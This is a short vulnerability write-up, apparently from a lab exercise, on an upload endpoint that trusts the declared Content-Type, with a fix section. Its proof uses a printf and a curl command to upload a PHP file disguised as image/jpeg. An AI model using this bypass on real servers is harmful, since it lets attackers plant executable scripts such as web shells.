# File Upload Type Bypass

## Breach
The upload endpoint trusts the multipart `Content-Type` value instead of validating the actual file contents. A PHP file can be submitted as `image/jpeg`.

## Proof
```bash
printf '<?php echo "poc"; ?>' > test.php
curl "http://<IP>/?page=upload" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@test.php;type=image/jpeg" \
  -F "Upload=Upload"
```

## Fix
Validate uploaded content with server-side MIME detection, re-encode accepted images, store uploads outside executable paths, and deny script execution in upload directories.

